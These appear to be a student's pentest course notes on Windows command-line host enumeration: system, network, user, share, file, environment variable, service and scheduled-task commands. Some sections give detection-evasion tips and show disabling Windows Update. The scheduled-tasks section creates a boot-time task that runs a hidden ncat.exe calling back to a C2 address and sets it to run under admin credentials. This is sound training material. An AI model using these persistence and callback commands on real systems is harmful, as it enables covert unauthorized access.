# Gathering System Information
![[Pasted image 20260424002213.png]]

As we can see from the diagram above, the types of information that we would be looking for can be broken down into the following categories:

|Type|Description|
|---|---|
|`General System Information`|Contains information about the overall target system. Target system information includes but is not limited to the `hostname` of the machine, OS-specific details (`name`, `version`, `configuration`, etc.), and `installed hotfixes/patches` for the system.|
|`Networking Information`|Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: `host IP address`, `available network interfaces`, `accessible subnets`, `DNS server(s)`, `known hosts`, and `network resources`.|
|`Basic Domain Information`|Contains Active Directory information regarding the domain to which the target system is connected.|
|`User Information`|Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as `environment variables`, `currently running tasks`, `scheduled tasks`, and `known services`.|

### **Why Do We Need This Information? 

Host enumeration is not just a checklist — it’s the foundation that guides **how** we attack a system.

Without good enumeration, we’re essentially guessing in the dark. With solid information, we can move with purpose and significantly increase our chances of success.

#### **Real-World Example**

Imagine you’re on an **assumed breach** engagement. You’ve been given initial access through a low-privileged user account. Your goal is to escalate privileges and move deeper into the environment.

At this point, you should be asking yourself questions like:

- What user account do I currently control?
- What groups does this user belong to?
- What privileges and permissions does this account actually have?
- What resources (files, shares, services, network hosts) can this user access?
- What processes or tasks are running under this account?

These questions help paint a clear picture of your current position and reveal potential paths for privilege escalation.

## How Do We Get This Information?

## Getting System Info from CMD 

So when you first land on a Windows machine (whether you're a sysadmin or doing a pentest), the very first thing you want is a quick picture of what you're dealing with. The easiest way to do that is `systeminfo`.

One command, and you get basically everything — hostname, IP addresses, OS version, build number, installed hotfixes, domain info, you name it. From a hacker's perspective, running one command instead of five is just smarter. Less noise, less chance of tripping any alerts.

The output looks something like this:

```
C:\htb> systeminfo

Host Name:       DESKTOP-htb
OS Name:         Microsoft Windows 10 Pro
OS Version:      10.0.19042 N/A Build 19042
OS Build Type:   Multiprocessor Free
...
```

Once you have the OS version and build number, a quick search on Google or ExploitDB can tell you if there's a known exploit sitting right there waiting to be used.

That said, `systeminfo` is a pretty loud command — it's the kind of thing that might get flagged if someone's watching closely. So it's worth knowing the lighter alternatives.

If you just need the hostname, run `hostname`. If you just need the OS version, run `ver`. Simple, fast, minimal.

```
C:\htb> hostname
DESKTOP-htb

C:\htb> ver
Microsoft Windows [Version 10.0.19042.2006]
```

Between these three commands, you've got solid coverage. Use `systeminfo` when you want everything at once and aren't worried about visibility. Fall back to `hostname` and `ver` when you want to stay quieter or just need those two specific pieces.

## Scoping the Network & Understanding Your User

Once you know what the machine is, the next question is: what's it connected to?

### ipconfig — Your Network Snapshot

Running `ipconfig` without anything extra gives you the essentials — IP address, subnet mask, default gateway, and DNS suffix for each adapter. That's usually enough to understand what network(s) the machine sits on.

```
C:\htb> ipconfig

Ethernet adapter Ethernet:
   IPv4 Address: 10.0.25.17
   Subnet Mask:  255.255.255.0
   Default Gateway: 10.0.25.1

Ethernet adapter Ethernet 2:
   IPv4 Address: 172.16.50.15
   Subnet Mask:  255.255.255.0
   Default Gateway: 172.16.50.1
```

Notice this machine has _two_ adapters — meaning it's sitting in two different networks at once. That's interesting from an attacker's view because it could be a bridge between networks you couldn't otherwise reach.

If you want the full picture — MAC address, DHCP info, DNS servers — throw `/all` on the end: `ipconfig /all`.

### arp /a — Who Has This Machine Talked To?

The ARP cache is basically a contact list the machine keeps of nearby hosts it's recently communicated with. Running `arp /a` shows you all of them.

```
C:\htb> arp /a

Interface: 10.0.25.17
  10.0.25.1    00-e0-67-15-cf-43   dynamic
  10.0.25.5    54-9f-35-1c-3a-e2   dynamic
  10.0.25.10   00-0c-29-62-09-81   dynamic

Interface: 172.16.50.15
  172.16.50.1   15-c0-6b-58-70-ed  dynamic
  172.16.50.20  80-e5-53-3c-72-30  dynamic
  172.16.50.32  fb-90-01-5c-1f-88  dynamic
```

The "dynamic" entries are the ones that matter — those are real hosts. The static ones (broadcast addresses, multicast) are just network noise. This gives you a starting map of what's alive and reachable from your position, across each interface.

### whoami — Know Who You Are

Before you do anything else on the machine, you need to know _who you're running as_. `whoami` answers that.

```
C:\htb> whoami
ACADEMY-WIN11\htb-student
```

Without any flags it gives you `DOMAIN\username`. If the machine isn't domain-joined, you'll just see the hostname instead of a domain name. From here you can add flags like `whoami /groups` or `whoami /priv` to see what groups you're in and what privileges your account has — which tells you a lot about what you can and can't do next.

## Checking Privileges & Groups — Study Notes

So you know _who_ you are on the machine. Now the real question is — what can you actually _do_?

### whoami /priv — What Powers Do You Have?

This shows you every privilege your account has and whether it's currently enabled or disabled.

```
C:\htb> whoami /priv

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

This output is pretty bare — a handful of privileges, most of them disabled. That's what a standard domain user looks like. Nothing exciting here.

But the interesting part is when something looks _off_ — like if a regular user somehow has `SeDebugPrivilege` or `SeImpersonatePrivilege` enabled. Those are the kinds of misconfigurations that can be abused to escalate privileges significantly. So you're always scanning this list for anything that shouldn't be there.

### whoami /groups — What Groups Are You In?

Group membership matters because permissions in Windows are often assigned at the group level, not the individual user level. So being in the right group can quietly grant you access to a lot of things.

```
C:\htb> whoami /groups

Group Name                          Attributes
=================================== =====================
Everyone                            Enabled by default
BUILTIN\Users                       Enabled by default
BUILTIN\Performance Log Users       Enabled by default
NT AUTHORITY\Authenticated Users    Enabled by default
...
Mandatory Label\Medium Mandatory Level
```

Again, pretty standard. Just the default built-in groups every normal user gets. The "Medium Mandatory Level" label at the bottom is also telling — that's a regular integrity level. Admins run at High, SYSTEM runs at System. Medium means you're just a regular user with no elevated trust.

What you're really hunting for here is any _custom group_ — something like `IT-Admins`, `VPN-Users`, `Backup-Operators`, etc. Those are explicitly assigned and can mean the user has access to resources or permissions that weren't obvious at first glance.

### The Shortcut — whoami /all

If you want privileges _and_ groups _and_ user info all at once, just run `whoami /all`. It dumps everything in one shot. Useful when you want the full picture fast without running three separate commands.

## Investigating Users, Groups & Network Resources 

You've checked yourself out — now it's time to look around at everything else on the network.

### net user — Who Else Is on This Machine?

`net user` lists every local account that exists on the host.

```
C:\htb> net user

Administrator    DefaultAccount    Guest
htb-student      WDAGUtilityAccount
```

This particular machine is pretty quiet, but on a busier network you'd potentially see a lot more accounts here — each one a potential target. The goal is finding accounts worth going after, especially anything that looks like it might have elevated access.

### net localgroup — What Groups Exist Here?

There are two commands for groups — `net group` and `net localgroup`. The catch is `net group` only works when run against a Domain Controller. On a regular workstation it'll just error out. So most of the time you'll be using `net localgroup`.

```
C:\htb> net localgroup

*Administrators
*Backup Operators
*Remote Desktop Users
*Remote Management Users
*Users
...
```

This gives you the full list of groups on the local machine. What you're looking for is anything interesting — `Backup Operators` is a classic one because it has more access than people realize, and `Remote Desktop Users` tells you who can RDP in remotely.

### net share — What's Being Shared?

In most domain environments, people store their work files on network shares rather than locally. `net share` shows you what's accessible from the current host.

```
C:\htb> net share

C$        C:\             Default share
IPC$                      Remote IPC
ADMIN$    C:\Windows      Remote Admin
Records   D:\Important-Files   Mounted share for records storage
```

The first three are default Windows admin shares — they're always there. But `Records` is a manually created share, and the description says "important files." That's the one you'd want to dig into. When you find a share like that, three things to figure out: can you access it at all, what can you do with it (read/write/execute), and is there anything valuable inside.

### net view — Broader Network Recon

If you're not sure what shares exist and want to cast a wider net, `net view` shows you everything the host knows about — shares, printers, and other domain resources across the network, not just locally.

### A Word on Noise

All of these `net *` commands get the job done, but they're loud. CMD usage alone is already suspicious for a regular user — nobody in accounting is opening a command prompt. On top of that, `net user`, `net group`, `net share` — these commands generate logs and will absolutely get flagged by a halfway-decent blue team.

So this whole approach is useful when you need quick answers, but you're trading stealth for speed. Worth keeping in mind.

## Finding & Evaluating Files 

At some point during an engagement, you're going to be hunting for specific files — credentials, configs, sensitive data. Here's the toolkit for that.

### Searching for Files — `where`

`where` works like Linux's `which` — it finds files by name. If the location is already in your environment PATH, you can just run it plain:

```
C:\> where calc.exe
C:\Windows\System32\calc.exe
```

But if the file isn't in a PATH directory, you'll get nothing. That's when you add `/R` to search recursively through a specific folder:

```
C:\> where /R C:\Users\student\ bio.txt
C:\Users\student\Downloads\bio.txt
```

You can also use wildcards to hunt for file types across an entire directory tree:

```
C:\> where /R C:\Users\student\ *.csv
C:\Users\student\AppData\Local\live-hosts.csv
```

That last one is great for quickly finding things like exported spreadsheets, logs, or anything interesting someone left lying around.

### Searching Inside Files — `find` and `findstr`

`where` finds the file. `find` and `findstr` look _inside_ files for specific content.

`find` is the simpler one — you give it a string and a file:

```
C:\> find "password" "C:\Users\student\not-passwords.txt"
```

A few useful switches to know — `/V` inverts the search (show lines that _don't_ match), `/N` shows line numbers, and `/I` ignores case. So something like:

```
C:\> find /N /I /V "IP Address" example.txt
```

...would show you every line that doesn't contain "IP Address", with line numbers, case-insensitively.

`findstr` is the more powerful version — think of it as `grep` for Windows. It supports regex, wildcards, and patterns, so when `find` isn't enough, `findstr` is what you reach for.

### Comparing Files — `comp` and `fc`

Sometimes you need to know if a file has been tampered with, or compare two versions of something.

`comp` does a byte-by-byte comparison. Add `/A` to see the actual character differences instead of raw bytes:

```
C:\> comp file-1.md file-2.md /A
Compare error at OFFSET 2
file1 = a
file2 = b
```

`fc` is more readable — instead of flagging individual bytes, it shows you which _lines_ differ and what's in them:

```
C:\> fc passwords.txt modded.txt /N

***** passwords.txt
    2:  password
***** MODDED.TXT
    2:
    3:  password
```

You can immediately see a blank line was inserted. `fc` is generally the better choice when you're comparing text files and want to actually understand the differences.

### Sorting — `sort`

Before comparing files, it's often smart to sort them first — otherwise two identical lists in different orders will look completely different and throw off your comparison.

```
C:\> sort.exe file-1.md /O sorted.md
```

The `/O` flag writes the output to a file instead of the console. And if you want to strip duplicates, throw in `/unique`:

```
C:\> sort.exe sorted.md /unique
```

This is especially handy when you're working with things like IP lists, username dumps, or any dataset where duplicates just create noise.

## Environment Variables 

Environment variables are essentially system-wide (or user-specific) settings stored as named values that applications, scripts, and the OS itself can reference at any time. They exist on Windows, Linux, and macOS — just with different syntax and behavior on each.

On Windows, you reference them wrapped in percent signs like `%WINDIR%` or `%USERNAME%`. They're case-insensitive, can have spaces and numbers in the name, but can't _start_ with a number or contain an equals sign.

### Scope — Who Can See What?

This is the core concept with environment variables. A variable's _scope_ determines who can access it.

**Global** means everyone. Any user, any process on the machine can read it. A good example is `%WINDIR%` — both Alice and Bob get the same result:

```
C:\Users\alice> echo %WINDIR%
C:\Windows

C:\Users\bob> echo %WINDIR%
C:\Windows
```

**Local** means only you. If Alice creates a variable with `set SECRET=HTB{...}`, Bob literally can't see it — his shell just returns `%SECRET%` as plain text because it was never defined in his environment.

### The Three Scopes in Windows

Windows breaks this down into three specific layers:

**System scope** — set by the OS itself, accessible to everyone on the machine. Requires local or domain admin to modify. Stored in the registry under `HKEY_LOCAL_MACHINE\SYSTEM\...`

**User scope** — set by and visible only to the currently logged-in user. Stored under `HKEY_CURRENT_USER\Environment`. Other users on the same machine can't see these.

**Process scope** — the most temporary of the three. These only exist for the lifetime of the running process. When the process dies, the variables die with it. They also inherit whatever was set in the System and User scopes, plus anything from a parent process if it spawned the current one.

## Managing Environment Variables 

Now that you know what environment variables are, here's how you actually work with them from the command line.

### Viewing Variables — `set` and `echo`

Two ways to check what's stored in a variable.

`echo` just prints the value — clean and simple:

```
C:\> echo %PATH%
C:\Users\htb\Desktop
```

`set` on its own dumps _every_ environment variable currently defined in your session. You can also pass it a variable name to check a specific one. Useful for quickly seeing everything at once.

### `set` vs `setx` — Temporary vs Permanent

This is the key distinction to understand.

`set` only affects the _current_ session. Close the window, it's gone. Good for quick, throwaway variables during a task.

`setx` writes the value to the registry, so it survives across sessions. The catch — it doesn't take effect in the _current_ window, only in the next one you open.

Syntax is slightly different between the two:

```
set DCIP=172.16.5.2       ← uses equals sign
setx DCIP 172.16.5.2      ← space-separated, no equals
```

### Creating, Editing & Removing

**Creating** — just set the name and value:

```
C:\> setx DCIP 172.16.5.2
SUCCESS: Specified value was saved.
```

**Editing** — same command, just use the new value. It overwrites whatever was there:

```
C:\> setx DCIP 172.16.5.5
SUCCESS: Specified value was saved.
```

**Removing** — you can't delete a variable directly. You clear it by setting it to nothing:

```
C:\> setx DCIP ""
SUCCESS: Specified value was saved.
```

Verify it's gone with `set DCIP` — if it returns "not defined" and `echo %DCIP%` just prints `%DCIP%` literally, it's been removed.

### Variables Worth Knowing for Enumeration

When you land on a machine, these are the ones worth checking right away — they hand you a lot of info for free:

|Variable|What It Tells You|
|---|---|
|`%PATH%`|Where executables are loaded from — useful for hijacking|
|`%OS%`|Operating system type|
|`%SYSTEMROOT%`|Path to the Windows folder (usually `C:\Windows`)|
|`%LOGONSERVER%`|Whether the machine is domain-joined and which DC it authenticates against|
|`%USERPROFILE%`|Path to the current user's home directory|
|`%ProgramFiles%`|Where 64-bit apps are installed|
|`%ProgramFiles(x86)%`|Where 32-bit apps live — also tells you it's a 64-bit machine if this exists|

`%LOGONSERVER%` is a particularly handy one — it immediately tells you if the machine is on a domain and points you toward the domain controller. All of this comes back in plain text, no special permissions needed.

## Managing Services with SC

Services are a goldmine when you land on a machine. Knowing what's running, what you can touch, and what you can break is a core part of post-exploitation.

### Querying Services

`sc query type= service` lists everything currently running. The spacing matters — `type= service` with a space before "service" is the correct syntax, not `type=service`.

To check a specific service, just name it:

```
C:\> sc query windefend

STATE: 4 RUNNING (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
```

That `NOT_STOPPABLE` flag right there is telling you something important — even as an admin, you can't kill this one. Only the SYSTEM account can. Trying anyway just floods the logs and alerts the blue team. Don't bother unless you have a plan.

### Stopping and Starting Services

```
sc stop Spooler
sc start Spooler
```

Before you try stopping anything, check the query output. If it says `STOPPABLE`, you're good. If it says `NOT_STOPPABLE`, move on — blindly running `sc stop` on protected services is how you get caught.

When you issue a stop, the service goes into `STOP_PENDING` first, then hits `STOPPED` after a few seconds. Same thing in reverse for starting — `START_PENDING` then `RUNNING`. Always re-query after to confirm.

### Modifying Services — `sc config`

This is where it gets more interesting. `sc config` lets you change how a service behaves — including its startup type. Changes here write to the registry and survive reboots.

Practical example — disabling Windows Update (requires two services):

```
sc stop bits
sc config wuauserv start= disabled
sc config bits start= disabled
```

Now even if the system tries to phone home for updates, it can't. Both services are dead on arrival at every boot. To undo it: `sc config <service> start= auto`.

A couple things worth noting — changes only fully take effect after a service restart, and this approach is not subtle. It will trigger alerts. You need elevated permissions for most of this too.

### Other Ways to Query Services

`sc` isn't the only tool. A few alternatives worth knowing:

`tasklist /svc` — shows running processes _and_ which services are hosted under each PID. Great for quickly figuring out what process a service lives in.

`net start` — the simplest one. Just dumps a clean list of every currently running service by display name. Also has `net stop`, `net pause`, `net continue` for basic control.

`wmic service list brief` — gives you a compact table with name, PID, start mode, state, and status for _every_ service on the system, running or not. More comprehensive than `net start` at a glance. Worth knowing, though WMIC is deprecated in newer Windows versions so don't rely on it as your primary tool going forward.

## Scheduled Tasks 

Scheduled tasks are one of the cleanest persistence mechanisms available. No extra executable dropped in a weird place, no suspicious service — just a task that blends in with everything else the system already runs.

### Querying What Already Exists

Before creating anything, always check what's already there. Existing tasks can be hijacked or give you ideas about what the environment does regularly.

```
C:\> schtasks /query /V /fo list
```

`/V` gives you the verbose output (all the details), `/fo list` formats it cleanly. You'll see things like who the task runs as, what it executes, and when it triggers. Pay attention to the "Run As User" field — if a task runs as SYSTEM and you can modify it, that's a privilege escalation waiting to happen.

### Creating a Task

The minimum you need is a schedule type, a name, and an action:

```
C:\> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

`/sc ONSTART` fires every time the machine boots. So even if your shell dies because someone rebooted the machine, you get a callback automatically on the next boot. That's the whole point — reliable re-entry without doing anything loud.

The binary here is `ncat.exe` tucked quietly in AppData (a common hiding spot since users have write access there by default), connecting out to your C2 on port 8100.

Other useful schedule types: `ONLOGON` fires when any user logs in, `DAILY`, `WEEKLY`, `MINUTE` with a modifier for intervals.

### Modifying an Existing Task

Say you found local admin credentials and want the task to run under that account:

```
C:\> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```

You can also use `/tr` to change what the task actually executes, or `/ENABLE` and `/DISABLE` to toggle it. After any change, verify it with `/query /tn "My Secret Task" /V /fo list` to make sure it saved correctly.

If you want to test it immediately without waiting for the trigger: `schtasks /run /tn "My Secret Task"`.

### Deleting a Task

```
C:\> schtasks /delete /tn "My Secret Task" /f
```

The `/f` flag skips the "are you sure?" prompt. Useful when you're cleaning up after an engagement or scripting deletions.
